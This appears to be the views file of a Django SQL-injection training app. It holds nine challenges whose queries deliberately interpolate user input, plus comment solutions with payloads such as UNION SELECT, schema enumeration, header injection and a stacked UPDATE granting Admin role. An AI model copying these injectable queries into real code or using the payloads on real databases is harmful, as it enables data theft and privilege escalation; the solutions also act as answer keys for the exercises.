import datetime
from django.shortcuts import render
from django.db import connections
from .models import *
from django.contrib.auth.decorators import login_required
from users.models import UsersProblems, SqlProblem


def escaping(a_string):
    escaped = a_string.translate(str.maketrans({"=": r"\=",
                                                "]": r"\]",
                                                "\\": r"\\",
                                                "^": r"\^",
                                                ";": r"\;",
                                                "*": r"\["
                                                }))
    return escaped


def _fill_employee_database():
    employees = [
        Employee(1, "Ariel", "Vainshtein", 26),
        Employee(2, "Joshua", "Graham", 30),
        Employee(3, "Abraham", "Yalkovitch", 28),

    ]
    for data in employees:
        data.save(using="problems_db")


def _fill_clothing_store_db():
    items = [
        ClothingStore(803654786, ClothingItem.SHOES.value, "Nike", 25.23),
        ClothingStore(987124123, ClothingItem.SHIRTS.value, "H&O", 22.10),
        ClothingStore(300125487, ClothingItem.PANTS.value, "Diadora", 33.99),
        ClothingStore(159845362, ClothingItem.SUITS.value, "Diadora", 99.99),
        ClothingStore(198742178, ClothingItem.TROUSERS.value, "Diadora", 19.99),
    ]
    for data in items:
        data.save(using="problems_db")


def _fill_vehicle_db():
    items = [
        Vehicle('111-22-333', 4, 'Toyota', 5999.99, 10564.23, True),
        Vehicle('165-81-713', 4, 'BMW', 6599.99, 9846.89, False),
        Vehicle('148-879-003', 0, 'Lamborghini', 10999.99, 11003.89, False),
        Vehicle('846-57-446', 2, 'Toyota', 7259.99, 8523.73, True),
        Vehicle('087-918-224', 1, 'Honda', 8250.00, 7999.89, True),
    ]
    for data in items:
        data.save(using="problems_db")


def _get_car_manufacturers(vehicles):
    manufacturers = []
    for v in vehicles:
        if v.manufacturer not in manufacturers:
            manufacturers.append(v.manufacturer)
    return manufacturers


def _init_secret_db():
    item = BlindSecret(1, 'Bingo')
    item.save(using="problems_db")


def _init_safe_db():
    prize_amount = 10000000
    safe = Safe(1, '4-8-15-23-48', prize_amount)
    safe.save(using="problems_db")
    return prize_amount


def _init_mockup_user_db(user):
    items = [
        User(user.id + 1, 'yxilith', 'notsu@gmail.com', '901a706ec09c2466e450e5ccda37c5', UserRole.ADMIN.value),
        User(user.id, user.username, user.email, user.password, UserRole.USER.value)
    ]
    for item in items:
        item.save(using="problems_db")


def _update_answer_for_user(user, problem_id):
    problem = SqlProblem.objects.get(id=problem_id)
    UsersProblems(problem_id, user=user.profile, problem=problem).save()


'''
    solution: 1 UNION SELECT * from db_employees
'''


@login_required
def first_problem(request):
    _fill_employee_database()
    context = {
        'num_items': len(Employee.objects.using('problems_db_read_user').all())
    }

    cursor = connections['problems_db_read_user'].cursor()

    if request.method == 'POST':
        input_id_request = request.POST.get("input_id")
        if input_id_request is not None and input_id_request != "":
            sql = f"SELECT * FROM db_employees WHERE id = {input_id_request};"
            try:
                cursor.execute(sql)
                result = cursor.fetchall()
                context['result'] = result
                context['correct_answer'] = len(result) == context['num_items']
                cursor.close()
                if context['correct_answer']:
                    _update_answer_for_user(request.user, problem_id=1)
            except Exception as e:
                context['error'] = e

    return render(request, 'problems/1.html', context)


'''
    Solution:
    First Name: a
    Last Name: b'; select id,first_Name,last_name from db_employees where '1' = '1' --#
'''


@login_required
def second_problem(request):
    _fill_employee_database()
    key_words = ['%', 'union', 'and', 'or', '*']
    cursor = connections['problems_db_read_user'].cursor()

    context = {'num_items': len(Employee.objects.using('problems_db').all())}

    if request.method == 'POST':
        first_name_request = request.POST.get("first_name")
        last_name_request = request.POST.get("last_name")
        for kw in key_words:
            if kw in first_name_request or kw in last_name_request:
                first_name_request = "null"
                last_name_request = "null"
                break
        sql = f"SELECT id, first_name, last_name FROM db_employees WHERE first_name LIKE '{first_name_request}' and " \
              f"last_name LIKE '{last_name_request}' "
        try:
            cursor.execute(sql)
            result = cursor.fetchall()
            cursor.close()
            context['result'] = result
            print(result)
            context['correct_answer'] = len(result) == context['num_items']
            if context['correct_answer']:
                _update_answer_for_user(request.user, problem_id=2)
        except Exception as e:
            context['error'] = e

    return render(request, 'problems/2.html', context)


'''
   Solution:
   Step #1: 1 union select 1,column_name,column_name,4
            from information_schema.columns 
            where table_name like 'db_clothing_shop'

   Step #2: 1 union select barcode,item_name, manufacturer, price from db_clothing_shop 

'''


@login_required
def third_problem(request):
    _fill_clothing_store_db()

    context = {
        'num_items': len(ClothingStore.objects.using('problems_db').all()),
    }
    cursor = connections['problems_db_read_user'].cursor()

    if request.method == 'POST':
        item_name_request = escaping(request.POST.get("item_name"))
        sql = f"SELECT * FROM db_clothing_shop WHERE barcode = {item_name_request}"
        try:
            cursor.execute(sql)
        except Exception as e:
            sql = f"SELECT * FROM db_clothing_shop WHERE item_name LIKE 'a'"
            cursor.execute(sql)
            context['error'] = e
            print(e)
        print(sql)
        result = cursor.fetchall()
        cursor.close()
        context['result'] = result

        context['correct_result'] = len(result) == context['num_items']
        if context['correct_result']:
            _update_answer_for_user(request.user, problem_id=3)

    return render(request, 'problems/3.html', context)


@login_required
def fourth_problem(request):
    _fill_vehicle_db()
    context = {}

    cursor = connections['problems_db_read_user'].cursor()
    if request.method == 'POST':
        manufacturer_request = request.POST.get("input_manufacturer")
        sql = f"SELECT * FROM db_vehicles WHERE manufacturer LIKE '{manufacturer_request}'"
        try:
            cursor.execute(sql)
            result = cursor.fetchall()
            if result is not None and len(result) != 0:
                context['message'] = "Exists in storage"
            else:
                context = {'message': "Out of stock"}
            cursor.close()
            context['correct_answer'] = manufacturer_request.lower() == 'postgres'
            if context['correct_answer']:
                _update_answer_for_user(request.user, problem_id=4)
        except Exception as e:
            pass

    return render(request, 'problems/4.html', context)


'''
    Solution: use burpsuite, modify input to use wild card %
'''


@login_required
def fifth_problem(request):
    _fill_clothing_store_db()
    cursor = connections['problems_db_read_user'].cursor()

    context = {
        'items': ClothingItem.get_values(),
        'num_items': len(ClothingStore.objects.using('problems_db').all()),
    }

    if request.method == 'POST':
        item_name_request = request.POST.get("item_select")
        sql = f"SELECT * FROM db_clothing_shop WHERE item_name LIKE '{item_name_request}'"
        cursor.execute(sql)
        result = cursor.fetchall()
        cursor.close()
        context['result'] = result
        context['correct_result'] = context['num_items'] == len(result)
        if context['correct_result']:
            _update_answer_for_user(request.user, problem_id=5)

    return render(request, 'problems/5.html', context)


@login_required
def sixth_problem(request):
    _init_secret_db()

    context = {
        'secret_value': BlindSecret.objects.using("problems_db").filter(id=1)[0].secret
    }

    cursor = connections['problems_db_read_user'].cursor()
    if request.method == 'POST':
        first_name_request = request.POST.get("input_first_name")
        sql = f"SELECT * FROM db_employees WHERE first_name LIKE '{first_name_request}';"
        try:
            cursor.execute(sql)
            result = cursor.fetchall()
            context['result'] = result
            if result is not None and len(result) != 0:
                print("found")
                context['message'] = "There is Employee With This Name"
            else:
                context['message'] = "No Employee With This Name"
            cursor.close()

            context['correct_answer'] = first_name_request.lower() == 'bingo'
            if context['correct_answer']:
                _update_answer_for_user(request.user, problem_id=6)
        except Exception as e:
            context['message'] = 'No Employee With This Name'

    return render(request, 'problems/6.html', context)


'''
    Solution: Open browser through bupsuite, press the 'search' button on the page
    while listening to the connection.
    Change 'User-Agent' to E'%\%' and forward the packet.
'''


@login_required
def seventh_problem(request):
    context = {
        'num_items': len(Employee.objects.using('problems_db').all())
    }
    cursor = connections['problems_db_read_user'].cursor()
    if request.method == 'POST':
        user_agent_input = request.headers["User-Agent"]
        try:
            sql = f"SELECT * FROM db_employees WHERE first_name LIKE {user_agent_input};"
            cursor.execute(sql)
            result = cursor.fetchall()
            cursor.close()
            context['correct_answer'] = len(result) == context['num_items']
            if context['correct_answer']:
                _update_answer_for_user(request.user, problem_id=7)
            print(context['correct_answer'])
        except Exception as e:
            context['error'] = e
    return render(request, 'problems/7.html', context)


'''
    Note: Trying to get an error message gets the table name.
    Trying to access the table with will result in special 'no access message'
    Step #1: a'; select * from secret_safe--#
    Step #2: Need to find the table where user data is store - db_users:
                   a'; SELECT table_schema,table_name 
                   FROM information_schema.tables 
                   WHERE table_schema LIKE 'public' 
                   ORDER BY table_schema, table_name--#
    
    Step #3: a'; select * from db_users --# 
    To get all rows -> will see admin, manager and user roles

    Step #4: Update user privileges, then try to access the secret_safe
    a'; UPDATE db_users SET role = 'Admin' WHERE db_users.username = 'YOUR_USERNAME'; select * from db_users; select prize from secret_safe where 1=1 --#
    
'''


@login_required
def eighth_problem(request):
    _init_safe_db()
    _init_mockup_user_db(request.user)
    context = {'secret': Safe.objects.using("problems_db").get(id=1).prize,
               'logged_as_admin': request.session['adminLogged']}

    context['show_login_form'] = permission_flag = request.session['loginForm']

    cursor = connections['problems_db_read_user'].cursor()

    if request.method == 'POST':

        btn_login = request.POST.get('login')
        btn_search = request.POST.get('search')

        if btn_search:
            search_request = request.POST.get('secret_password')
            sql = f"SELECT prize FROM secret_safe WHERE secret_pass  LIKE '{search_request}'"
            try:
                cursor.execute(sql)
                result = cursor.fetchall()
                context['result'] = result

                for itr in result:
                    for val in itr:
                        if val == context['secret'] and not context['logged_as_admin']:
                            print("hide 2")
                            permission_flag = True
                            context['acquired_secret'] = permission_flag
                            result.clear()
                            break
                        elif val == context['secret'] and context['logged_as_admin']:
                            context['acquired_secret'] = True
                            _update_answer_for_user(request.user, problem_id=8)
                            break

                if permission_flag:
                    context['show_login_form'] = True
                    request.session['loginForm'] = True

            except Exception as e:
                context['result'] = []
                context['error'] = e
            cursor.close()

            pass

        if btn_login:
            username_request = request.POST.get('username')
            password_request = request.POST.get('password')
            user = User.objects.using("problems_db_read_user").all().filter(username=username_request,
                                                                            password=password_request, role='Admin')

            if user:
                request.session['adminLogged'] = True
                context['logged_as_admin'] = True

    return render(request, "problems/8.html", context)


'''
    Solution:
    Step #1: Open burpsuite and change 'connection_time' variable to exceed 'cookie_ready_time'
    Step #2: 
    In the minimum price field: 1
    In the maximum price field: 2 union select price,num_of_accidents,total_km FROM db_vehicles
    Make sure the condition of step #1 always fulfilled
'''


@login_required
def ninth_problem(request):
    _fill_vehicle_db()
    context = {'baked_cookie': request.COOKIES['connection_time'] > request.COOKIES['cookie_ready_time'],
               'options': _get_car_manufacturers(Vehicle.objects.using("problems_db").all()),
               'num_of_items': len(Vehicle.objects.using("problems_db").all())}
    cursor = connections['problems_db_read_user'].cursor()
    if request.method == 'POST':
        manufacturer_request = escaping(request.POST.get('dropdown_option'))
        min_range_request = escaping(request.POST.get('min_input'))
        max_range_request = escaping(request.POST.get('max_input'))
        sql = f"SELECT price,num_of_accidents,total_km FROM db_vehicles WHERE manufacturer LIKE '{manufacturer_request}' " \
              f"AND db_vehicles.price BETWEEN {min_range_request} AND {max_range_request};"
        try:
            cursor.execute(sql)
            result = cursor.fetchall()
            context['result'] = result
            context['approve'] = context['baked_cookie'] and len(result) == context['num_of_items']
            if context['approve']:
                _update_answer_for_user(request.user, problem_id=9)
        except Exception as e:
            context['result'] = []
            context['error'] = e

    response = render(request, "problems/9.html", context)
    response.set_cookie('connection_time', datetime.datetime.now())
    response.set_cookie('cookie_ready_time', datetime.datetime.now() + datetime.timedelta(hours=1))

    return response
